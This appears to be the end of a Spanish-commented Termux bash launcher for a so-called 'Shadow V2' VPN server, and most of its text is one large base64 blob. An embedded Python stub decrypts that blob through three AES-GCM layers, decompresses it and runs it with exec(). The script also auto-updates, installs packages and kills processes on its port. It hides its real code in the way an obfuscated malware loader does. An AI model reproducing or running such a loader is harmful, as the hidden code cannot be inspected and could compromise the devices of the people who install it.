3lqN2NjMjhpajdIMTg2QjNHQ3UwSzdnWUpJMy1qWUFrbkVldDFKdnJvMy1qSm1ydDU2UWhXRkgzLUhFZ01kd3R0cGwyTXBIVkZiTXExdXlJUWxMbFlfWThhTHZ5YzY2bmYyWFNKUkxmN3pWNUliUmZDNFJQcVF1cW9UU25ZbHhQdEViNVM0SzIyYnFEOUZPbHNyYzZ5VmlCVGF5cE42X1B3MnhZTmk1UWROYXNNdFUyQWFpaGp6dl9NdHlzaDdIdGM5cUFaNDE2UlM3dGdKY2tQTkt2U1pXLUZKWGs3aHVqUm9HZVlNelUzdTVfMWpxcDhoUnZJemo5YWVod0xxNy03NXl4NHlER0Z1enJtSGJZSmxpSmhBVndORkVRU0lDUUljOXZrRmhpdkhsM2FqeXhFOEJRMGd1cTR4aUhGYmlGMmgyNmRIMmpWQzBlUmZPbHlYM28wbmFzcTFiZENMVjJoV3ZzRFR4ak5XeVBQcHp3eFlSVFFUSG0zaDc2Y0d1bzJ3YlN5Sm0tSmNfM1lSN09pUXhNVXpYX2JQQkVZXzNZTnRVZmxWUk9GeTFMNW9NdFpENnpHWlo5OGZMRF9qMDNQanVIRTJqZlJ2bDRtTzUyalo5a0NMblE3ZUkzSGx3cGpnNzJtN2oxR2g3THNKYW9qYXlDcVc3Rkxpay11SmtlU3NXa3kzazZuRllibUx6M1NDY250SzRKUWZhTlp6U1VPaHM4aGpZSmp6UTVKdW9sTWxqa3UtLVdPTGxjSW1VTGlDSk9RQnhjVjQ5RUwza1pHZ21MaHY0eEQ5VVVsUkNtYmt6MFpCcHcyRXFpS1hTNDNQRUxrTVhHTmp4WHBJM3UtMWhoSzRheHJjRE1ZenNPNXhwX0VFVGh0THdxclU1elhUWlZQckg3NTl4Mlcxc3lYaFV0RHdibnBRX1Nxb045XzJqWEczbW01bWkxM3NzQTl4ODdVamZTLVJpcFVxX1pGeWI0UWtZQzNRdWpWeUV6bXFNeElsMF9rbUNlMXg1bU9aWWVwSzdHcVVTTloteGhlaHl3eFprYTF6NnE0cnlQZ2N2LTVTNnpUcDUtVk1yYUx2a2pwR3hTaFFRcmlRaXNSS0psQTlCdVBld2gwSmNORFVrQnJadTBKWW1rUlZmNUI5bVJVZUZCS3NCNnJOb1hFMk5ONG00S1RUdkhTWFpTRHhJXzNmRnp3SkF5WV84Ymc4bE9DUzBSLUl3R05kNEdVZl8tRTdYQThSV2xMRWN5UXBpNlRjdy05eEsxekZOaDBER2VqbGNrVzBveHI2S0ZPbzRrRHU5NGRSZ0JER0RLb29KM1JsTjFtdkxRU1VtUk5BQVBNSEpjd3RGT2JWX2dxcFVSS3RQaE85NExwQXl5TklUMGFUaFZ3bkppM216UGZseU4yT0gwMjdXdnZWVF96aEg2SlFYSEIzcVZvbzJud0FPQjRrLThRNnJoZ3R0ZUJ0NF9hMjM0SU1CR0tJMm9XLXFkdTVKbzNIbDFOcjloN0xoZkpiZlB0M1kzMjdHcUo5UndWcDlDdjFySmh4a3ZFZFVNREdvMW8tUmJzLWloUnF4Z05wOUdsVXkyRkMwZzdBRjhGWVVpdUQxUWdpbzNKZTZxWEpWWE5USHZzeVpmMUhnMWh1NFA3VFVxekRvLVRmSl9EWEpzSlR0a2hPMU0zTU5vT1JKVVpaRkh1Qm1yWlVrYUxhSS1BRHd2QUUzZWx4VjYzcUZXSTRtUFhYVEJRVUQteFdBWnRCZ2tHVlNXTWNiQlhpZ3IxelVhNlpsTl9xQlNHQzIzcHQ4M25fSF9MbEhWTVo2MU9VZWdxVTZsb3pzWWdpdzVFRnktb2FYZGpkMEZieFZvMU00RFdHYTA3Ynl2OUlNckRxTFdUTl81WTVZRThZaURZaUhjSTlkY1dGTG1WZFU3SURjamI0Zk83WTR2UXpfbEhKU0ZjU0d3ZFNySWl6anBvQkRVTV9RSHJGXzdqMHFuR3N1LUstT29hVF9kRU1RVDFwcG9paW9RT2IzZi10bmxZWUxGSEtHWkZQaXZyRWNVeUJHejQ1cmZyWUZiX1RVLVhVSEZaMFM4WThUellSWGQ3UUkxaUliVVpnY3JDOG1YbVVoclNMdHZsbC1CWFhvbHV3RWtWZXJ6NjVXVXd1NDhkZW5OMEhla0V3MDVqUnduNEc4a1pGRllTQm0zOXp4X0ZjWWJaTE95R2tiZFVucjFqOV9sUDBXTllnNWx4OFViWGhnRE5uaWxadDFGZ1FIN0dKTmRITDA1aEJUR0VMY0dGNnoxTm5EeS1ncmhKb294X3Q2NnY0blhpQXpqWVJ3M2Vxd004bFp6Ymdjbmhld21JQm54SXBtQklaS3owd1NxMXFKdkdfRU45OXl2ZjN4eEl5TVkyU3RiMFl2czVyVGNYdG10RTR5ejVZdVlCdTN2M3ZlOEZPOC1EQTRPTnI5OXNUVkpoV09iWk1IVFNMWFBzWnRoZDU3OUY2enhHYWZwMDB1LVhTeG5ORTVQOHFkUnlKdFdYM1dTRHprcG53S0o0UVROcXhLb01ZMHE5cTFpc0NyWGI3N1piN0NZTEt1NFFxcnRuLUEwaFUyWllCdVU0dnJyU1Y4ZmE1S0QxM01wSGd5cmN0bGtFR2RUZ2pYTzg2SC01RFJaeFBpeFdqU25DblgyRldnT2JSUjliMXBla1lNSGhoa25kNlgzOFpTU0FuWkRQcjNtdkpoUkh0cUJXZXZpX0llSUp3TjZXUnpNS0pKS0M4VkVITnAxdjlNNV9SekloWEV2Q1BxMS1zdGdheUpPaFRmLWJ2TVVsWGR3eTR2QV9vZHJWTW9VeXgyMVZ3Y0FrU1ZUN3p1QXlIVWcwMVZiT3VhdEphZ3RHU1g3dmkzVDU4d1h6UU9ZYU15T0Y1TF8ybWRxN3RxNkhleTlQc21FUFYxOFppR296YnA3bWxObW9JLWVISzlLcVh4cXNoU1hNUVoyRUp6cWllbDNtblhrdG1Ic2UwZUszSHBwRFVBOEV2MEJ0VEY2eUEwTTEycWUwS1FvYmw4TVRTU2o5T1l3dkVIeGxaY3NaWkRnQVdtMjFURU9fM2RkZWZGTWIzdVB3ZW1RTzNjSEQyRnVzYS1yWXZRMGd5eDNIbjA2NTBwM2ptUWM2aEtXUDRRX1d3ZW9TNzM1dEZRcGg0MDZ5S3NTLW5MdGVwVWh4RXZWbmlYN3pmUVY2eXlIWHkxYWs0X1o5NTNqZDZ2Y0otV3NIU2FfNGNDRFpGZmR5ZjJHQ0ZSUXFRbEt2eEtwcXhIcXZuZGpka3gyV3I2VFY1ZEgtMDNOWDllWWI5TWVSMFVTNUNWb1hOejU0ZHpFUkNibE5QSWNrUlg3X2tkSUt6eV9oVXZ1OFV3Smp5b1phcFAyaHI5UXFGeHVmSngwRDhRb01Yd05EOVBnaExqRFRaQlYyMVpkTVdPaG8yQkZhUzktbXJrUVBwTlZGYWttRXV0N0xsdzI4SDEtQUI5dGlQZnBqZzJOMnVVd1QyZXp2Y2lMYUdOV0FfQkZFRmlLVXp1cFExVG1CVXNoTEZWbVJubkQ2ZW15VnMwbmh5bmRUNTFVeTFGbnZCbVZRSi1BeTR1QXNRSzNMSzFVWHFwcWVXcmp2UzNManZCTlhQRTU1ZEpBYkpDN0wtVkt3Rm9hcW9QOENyQ0FLMUoyUmh4QmlMcVBEdWd2NXdVQUdVdHZIOFlQSWxvdkFubFJVZ1BlSzYwV2x3c2cwR20wbi1uT3pjSVRPVmpCZDd2U254MV8tSUYzRWVxbG9PRmY1bklqQzFxbjZjc3hOWXZ1b3BpSlE3UnZWUlRBWVcyRWVUOERYT1MyWVZIbDRMc2VtbksxOU90TlFmMXVYalM2UWF0cG1GZjloR01ManZTOVZ0U05ycUJ5NkY4SWlBZHhGOXdxWE9wc1gtc1QzQ1J4dkt2NF9ZaFgtTU40SzVlRUhud2plTzF4VjF2cDF0cHVjejg0bVg2dTRheXNKWG5aZG9pZE9EWTJtRmdvX2I4SFNEbzlPZGtvVnpxdGlmZUlwWG9PaDlyNXhyT1lVLS02Zy1INGRudktUeFlPYzdyTG1DcE83ejA3eGhTeUVqQWtvMFZzYm84bU1QQzJlWXVRYm9CTEdZcWF5eTRUeHVqWGY0Mm55ZG1DZFhvdHhGU1VQQzNUZG1KSWdNU3JkSnNTSUlEQWZ1eUZyQ0ZMWkFoMWlBS2otNDU1UkRJc2xQV1NQWElxQWtOdVFQLTZVYVZURjllakRpWHBTcnl5Z1hiTElJN2FxR2hwRFU0S0p3eUtKMm1PS3BNa2NrMTR0SnVFZC03cG1KZEZzenZ0OGZTeW0wYVU4Ukd3WlhOSUhRWk1jM09WSjllV1pGek9yVzI2SGxpbXNucHp4aFo2MHpxMm9pMDgtcXk4dEFmSEh6Q2dYV2R0Qk5JMDU1N0hialA0aWRwRENDbENpNFlTbzhQSXRieXljcnRtNU92bk40XzRod1JKQjlMa0xwVzdCRUlFZXVPY3VvemNvZlRxNDY3NTFuaUo5S0s4eXBUeFFubHF2YzBjNHJNWDNmVzVPLUFFazNoYjROZjZzamdhcUtIQW1zY0lHUFM0bHA4aHg5Nmd4QWxSanZoamhyR0V6ZFg5NjZYVmxwanBhZUszQlh3YVMteHRiVkdIQ015bkk4SS1RQjhxcE5KbmpwS2MwRnFmQ2VhVU9iMklfY3NXcHFUbGpXN21qRFlBWjZnZTBpdm5KelU5Vmg0aXlXSjJjSlJzS1pCVFVIWkFGam9zUUlNRTF1aEo5eFBnZkZvQ0JmU3NSS3k0aXR3STZkQmNjeHpTVUlpR2dldF9DUi1yMDhrQ0JRTWNTcnBRMm5lcjc4Tkp3UGNBSV9LUHRodUhuamJaYlFQb2ZPUWNyRDljdHUxNWt5U2ktdVRveTlvQTZuSTFrclVPNnQzZVNfWl90V2JVWTdQMUFUZl9uSm9UTVdvYmxDbGdPVnk1YWkwcTBsMHM4WVgxek5UNHNlTmhWSTRVSzdKVUVOMjIyN3lkdlRYX1NxdThtd1dCSlZpLWFidUU3ZUJmSlEyQ1pLbXRwUE1veEJTSFY3YjdHal82bHFIMEVsenhJd0F4UGlLdnYyVlFJWnJaZ01GZ01VLVFtRWVNaU9RWlRMMnlFRlRhNWxfeUdPWnViZy11ZWNZajhfem9najBTWmx0TVY3ZTJha1F3dEZuV0RNVUFGTTFxbi1GMnNNZkpHaE5KQVd0WG0tRXFmU3pVNS1zelFGRGVLS3ZFWDlkN2lmbm5XVU5vTXZmVnBhV1N0LXlMTDlaUkdRMmwwdldqZjUxZ2k1bS1CaFMzazJNWGsyMXZjSzVlNnF4NEJDaE1oSTVjVlo1dC1BaDkxZUpyYXlhZTJaRDFjZUcxbzhPWHREenBSR19hS3d3Sk5Nb2tBUDJYN3dGZlVVRTF2RklmSVpvSS10S3dQaUEyWkxiSzgwQ01BYWxRSTdnTGdZSXZLUk1vbzVtOEtNMUNUNnBuTktyWlk4SFp3YTh6Z2tvejRZNHJpeVM0dDFueW95Qy10UVdzNWRDckREcFYwM0hrcjNOUldPZ1BJYktPTDl0MjY4QW8wOEpHRHlrcHQ4Y0l2cDNCdTk3RUx2ODRmX3Jpc3dBM1R6cEZDUzJULU04MU8wWHhnY1NLcTAzX2hFdTZraVRfOWR2THg1d3RNSVg0NWZRNEM5THpOWDNwM2NFRFZBOXplLU9yc21KRXdvdzlzZFNCLXQtMzJ3ODJCakxScG9HWnlpSHllSlJsYXJkbk5WMHA3Um5rbzhsa3ZiS1gtanozZlB6bTNBSURmM1FWQXI4Nmx4dV9uZ0Exc21SOG04clpqVzRqUXFURUx2OEk1STk0OE5IUmtJSGNkTnpHQW84aWVGOUFicWZ1SWl0UWVjenlLN1BRWXB3dkl4SWxXNDgtNFE5amY0aDVtbGx6SWFweWQzTHZPZU1SX21nTV9xOWNFR1dXT3FlUE9hSzVHamRvYWdLRW11ZEFKV2owcjFNWkpKemwxNDNJYm1XbEMzQTNSSXlwaGZ2aVlnZmJFOUsyQjdLLUg1MXdiQ05uWG1md04zcmhjOFpwYzhWWl9mcmFFLWFERzFJamk0dU80eWsxQ0xRb2lPcE1uTG9CXzM5dHBlbVZfdHRSXzVtck5pM0pUeFcxMHRXUktQckFsbjh0TUY4ZWJqWU45ejVoRm85V2FteVF0emp5VFNPOXdCb0Rpd0tfTHVvUkI4UTVLbHVlUDlzRHlHeGJndDJyOFlYdVNHc1ByaTZvS01MNUozZDN2TV9CcXBuZ25FdDNGdGlHVFl0UUg5M3N1M0pKS0U1d3VvdjVtWXMyS2J0eEd0amVZeDVRUGtjMGpkcDZPaE5jXzI0TFAzaDB2YlVyUnVTeWgyR1dHWTNnNy1oUEVWTk9EbE5BdENtVTF1VVlEemlYVDctUjV4bjhMZl9PSWhVQU1paDVqeDQ2UTBidHhVZzNMZ05DZkdYMUp0UHVBbG1KWHR1a2xvUWpheEdlaE5ialFreHpmM3E0V21tMVFEY2ttdG5COGxTLXhoSTd2MmE0emhuRC05cGhFT0FSRUFrMVg0MVgyTmRMYzJtNlZyS2x2UXdDOUhPTEZuY3M5Y2FpX3VDLWdveUNIaTAwZ2pId21DbV94Zjc0ajJqd0g3ZDBfOVgzREsxQ2VFeWxNNm83Z1Zva3RTRDBsMTNtdGVwZ3VxSng5U0xGczk5OTM2eDVSUVJ6Mkl5M1hzdDE1QWFDQlhyM3BWWGRuWG56VjdGdDVPQlNZVFZQWHE5LWFuN0pPOW5lZFlqTVZtN3o3emVVVXJHb0tTcVdDTGVSWlZqWlZsRk1vVG05UkpNZXZuXzV2NmdKb0lyb1dKeTMwZFNwS0JGWWZBM2RPUVZoMUd3UHc1NV8zTWh5V20wQ3NSMWRscGQ1U2JVWjlwaEVLNDFXVzlBQldLUmFEWlRuT0NCMlozSHFCNmhSUi15SlYyNDZpZkFrMENWaTJjZU1lSGVNUnREeWFjaU1KaC1tLXd6REVZbFpVbGVHdHZsNTJIaHV3WlZJR1FQdjM1b3dWWmIxejNkMmx6b3V2ZGZmbFpYMlpQcVMyY0FQa1A0MXZ3eUlhV0V3UWxKN2N1QTdIYWo1UWw5eGpKLU13Rkt1RE1odm16WFo3X2FXZUtaVzNka01EVktKYWJKbnAtOEJqdXVrYmZmcnQ3WmVZRUdmVDJ0a25RUENBTFlWQ1Y4TUxaSWJJakE3UDJVeGluVEQtbWtqREtzV2pQU0JDVnhNcTJ3S1RVZk1tYURjWll4aVlfczFhOTZaWlVzbjJsVXUxbDRtNHZMYnhSNHpLblZXR1hKUXdJMlktVEluOEw2Z0I1cndINzRRN0pWd1JXQS1QU3V5Z1RPaFQ1VkJBNXNYcXNjOUdkbnU3cU9xeWxnYlktMVJFOE12R1VNbUx2cTNsLUdkV3RETUg4ZEhqRXZrY25XR1JkT0wwaTZtUkZBMHNHMXRXRmZocnZnYXFOTjlOSnFrNHdDblhFSXBhM3ZtLUpOMGxTOFFqZ1FUSDJzY2djZlhLWERpZ3A1Q2VpTkw5UkR3R05jRFI0dVhUVlZ3NjVRQlY4TmhGSC1paEUweGJpY3NXb19pQUdocWEzWXFRM3dQalFaRl8zVG96amlwMlMwR2o3UHZJZkZJNGRhd01aR05XTllmbHRuSTRSRGpMT1JTVC1yU19sLWw3SFhIOVNSZGFUMGhzOUozQXpjZnFSTWRGeEFjcUkzd3pRaFVtR1pxSkxJWUZkUnlreVJuLWJ4NWhKMi13a0NVa2lYR1YxbmpUMXVOb04xU0p4NTZiLXpza1JlNGNzaFFsaU1WRVJBTW5KYy1iUFJOblQ4Z2VKVk5nN2pzbUFXeEZQa0k4b1k0TG9mUk1Vd2lteWdna0V5TEx0Skt3NEN6ZGRyUXZ0cktpME1ZSEE4cWdiZlFCR21SbkVWSzJPQm9xTmFTVjQtc1ZTdnNIZ1MxS1dLX1NHTmZEM3JWWUpCNVBVR2RLZ05weEk1b040NUg3ZDRVQVFsUDJKcDh6M0d1MS1lSEdBLWp5YzI0RUFIMG9vcmZRTXZoenU3YV9IQ0ktNWJMQmZ2ZllKdVFMbV9heG9ycEsxeEZGM28teTJScVFqa24xcTBtVlVzSV9OVjlnUFhnckVQcldZeDBWVEhqNTBMeWx4dlhLcTAxQ29raE94cEVYOGRmNlJ0TWJjdFRCZmpvbjMzS01WV1FqTHVyRGhyVlVtV2tyUUJub3N5NWZPV25oVkFRc2QxMVBGR0drYnNZT1c4eF9jRWd0VDRqVkNMUHlQeTdkbjZGd2ZDMzdWUm5MbFlUTmZrOEJBYUJtQ2JrTWhMbFkySWRWNUx4Y2hJY1BnUGdCSzFKWUotRHhxWHdrdi1MaUJjVnRkbDcwOUhqSlJtUDRNLWpPTW1OSzFaem9LeUFPSjRfbkhVdHZQVzlpYzljNDNkejJMRmJyaWtVdlJBXzdSUVVjTGl3Wnp2elFCODFsenlCa3NlY3oya1ZJRWlyaTQzbm5OMFhtUmQzc2UzbXNXMmczeVhkck1hbTV6V3dlRmxpeF9JMWFVLUU5dTZ1V3R6VnZJRjcxYnBZckFnSmZacjh1d05xQU9EamszUlNLdGdtZTlCMDlVZW5CdThTMmxlWFdTZmN0Rmx1V1pfU3hxUzJ2VDZQR0t4TjlIN3E4eFVzZTFfcTZPbnN3ZlZHdmFGVGJkVzZwUTI3dzh1ZU1BaVlfajloQVNMRHQwVzJhUGNRazJWV2dCcHdETEN3TWJ6d29EVTFQTVV3SGowZ3NZSUtpc2tkRU1SaFlLRzlZMVdIWVlZTUJ4czBFbHZHZUFsMjlEQzNzVmpLWmJhQ25WV29aazJCNTFpR25XRkh1Y2t3MnNyTkctN3JmeXJsQmpIQ2lVcTFUOGRsM2NBd3d0dDBtSFIwU2ZhVmktR2FWZUQ1enlUUG5qWi0tVlNNclJyQXRhRVAzTDZ1dXlRZEVfd3ByX2dWMEtXRnFlcFcxVXhjT0dTcnhXb0V0c3VIRUVxeWR0LWRyb1dleFE5V1lvUW1WNkNBVzI4M20xNGMtYkgxQmxueWViNTQ5LXViSnlfWFZQcTRiSEt4VlczbkFsOU1wR1hHNElQMVZZMDBRRzNxWHdITnlkYWg1UjhjRWlYUGo5THIydVQ0clh3Mlh4UF9FV242UHdKbVZPUFdaZDVianMyaF9KNFhXdHRUZF9jNm5ucVBIY19xQ3VlZC1jNmt5YzJRSEZuSEtlb2lLX3hWNHNVcU9oVHlEN3pLOWZTd0hzbnFzd2I3TU5Hdkpnd2tXc3d0R1hTMHFaTFpHRmFya1dxZGMwLXdDNGdKTmZUMTJWdFhMNjdfNkdyQnljMjJxRlNvN0JEdUFvcVhSQzZKZnl3bHZ3YXFNcUxmVWkzOHJiRXg2dGxUUm1BMk1MR1N5V3lCUWs1eC14bXQxcEJCdkVjQks5WWFmTmJHWVRQdnBrLVJYUDB4NWpMclg2ZTVRdWRsN193czFhZHBiYnBUVktQdDE5Rk4tMmxES19WRWVlQ251Mkt5UEJ5a3lGSVJ2QTQ3a0xwT0pzV3FGenQtUFcxMkRZWVN0RnFxQTdWUWFzZFo5cDllZmpnMnczbmo0cEVUS3JXMUp2eVNFaHpuYUlNZWt0M3JQLU5sYllqbFFMdV9FcWNjUHdpZDJqZS15dFZRVjZ2aXpnVl9SRnlEWnBmUlN0a3l5U2xROC1aZXpXVVpLWFVRMGRRZDliZjBma0tlRm9jaWxmNkpfemh3dWlNc0cxenBrdnRsa0ZVNE4zOU16UGpEbktTdnNYNnFfOHhRdlllOTJlbEwzWmUtWVozb0hNTUNPbW8xcm1ZRjMtdm5Uay05LXJZT0c2ME9MclM1dkJsYVBBNDVyQllrN0NEV1huLXBEamJwNGJFalhUQkVRd0JZMHdILVJoZXpNUGJKZnlFazA3N1FIUHNSeGR3QVpad1VHMUwxN1p3R0NuOU5FV0xWMlF4QWthTWwzTU5rRkhFUHo4WXd2aWp5YnloY2VTQUpxZkY4VEVKMXM0a0hrcGZfVFlLS2lZbGZVWVdfT1IzMGp0R0FFdUxPczN3cDJUNEoxTk5JNnJfWU1RQjRuSUhlR0oxRkh2dVZFNWlCNkZ1ekVwTC14MnBJZXVUYlFyWExoRXNJUTFvblVGb3J6WmhQWlJ1OVFvZGpRcUNodUlfNVlKVnV1YnJWYi1ZOEdXSGVnY1FycG1SRzdSOUU0bDlBZ0xFQUN2RTFxYV9rY3g4U1NUTEc3NTJWMGtpa19kU2U1UUl3dDZxVHVoUTlLa1E2eWEzd1l3Z0Rubjl1TmJ1bGI5MGszYnd4LWlnM0Z4SzkxSFZyVDVpS3BTMUpySGVVZ09fYnRBYnp6ZG1oak54UXlPS2dkU2poS1hKcFMyOS1FMWtwYWVNUmt1QjhkdDc1ZjZkOGN5U3JCZGdwOFl1Z3NBMVFGTFhuN2N0OWNNdnBOdlI3WE4yZlVYcmh1MjFqaUJvOFN6OWRDRHFITnJ3ZEpOSDVQRFJUUm1WR05kT3hGUExFclNYN1phWDl2Y3ZBa2tsRmoySm5fSUoxQzFFaHVtWnZPSEtOYllPLUVvOXBBWEdiTSIsImsiOiJOWEZtV1RWbUtpeDNaRzk3VlZnMFdYMXNSRzVKTkRCWldWbEJlbTVqVEQ5UVRtSmtVVlVtVkRNcGJrNUNMbmwzIn0"
layers = 3
iterations = 600000
try:
    data = _b64d(payload)
    for _ in range(layers):
        obj = json.loads(data.decode("utf-8"))
        salt = _b64d(obj["s"])
        nonce = _b64d(obj["n"])
        ct = _b64d(obj["c"])
        embedded = _b64d(obj["k"]).decode("utf-8")
        key = _derive_key(embedded, salt, iterations)
        aesgcm = AESGCM(key)
        data = aesgcm.decrypt(nonce, ct, None)
    source = zlib.decompress(data).decode("utf-8")
except Exception:
    sys.exit(1)

exec(compile(source, "<shadow_core>", "exec"))

EOF
        # FIN DEL BLOQUE PYTHON PROTEGIDO V2
        
        log_msg "SUCCESS" "$VERDE" "Núcleo materializado con cifrado SHADOW V2."
    fi
}

# --- 2. VERIFICACIÓN DE ENTORNO ---
check_env() {
    log_msg "SETUP" "$AMARILLO" "Verificando entorno de ejecución..."
    
    # Python
    if ! command -v python3 &> /dev/null; then
        log_msg "INSTALL" "$AMARILLO" "Instalando Python3..."
        pkg install python3 -y
    fi

    # Cryptography
    if ! python3 -c "import cryptography" &> /dev/null; then
        log_msg "INSTALL" "$CYAN" "Instalando librería 'cryptography'..."
        if ! pkg install python-cryptography -y; then
             log_msg "WARN" "$AMARILLO" "Fallo nativo. Intentando compilación..."
             pkg install build-essential openssl libffi rust binutils -y
             pip install cryptography
        fi
    fi

    # Requests + BeautifulSoup
    if ! python3 -c "import requests, bs4" &> /dev/null; then
        log_msg "INSTALL" "$CYAN" "Instalando librerías 'requests' y 'bs4'..."
        pip install requests beautifulsoup4
    fi
}

# --- 3. EJECUCIÓN ---
auto_update "$@"
clear
echo -e "${CYAN}   ___  ___  _  __   ___  ___  ___ ${NC}"
echo -e "${CYAN}  / _ \/ _ \/ |/ /  / _ \/ _ \/ _ |${NC}"
echo -e "${CYAN} / // / ___/    /  / // / ___/ __ |${NC}"
echo -e "${CYAN}/____/_/   /_/|_/  /____/_/   /_/ |_|${NC}"
echo -e "${CYAN}       SHADOW INFRASTRUCTURE       ${NC}"
echo ""

generate_payload
check_env
check_ip_range_ifconfig
log_msg "LAUNCH" "$VERDE" "Iniciando Servidor VPN SDC (Shadow V2)..."
echo -e "${CYAN}====================================================${NC}"
if port_in_use; then
    kill_port
fi
python3 "$SCRIPT_TARGET" --port "$PORT"
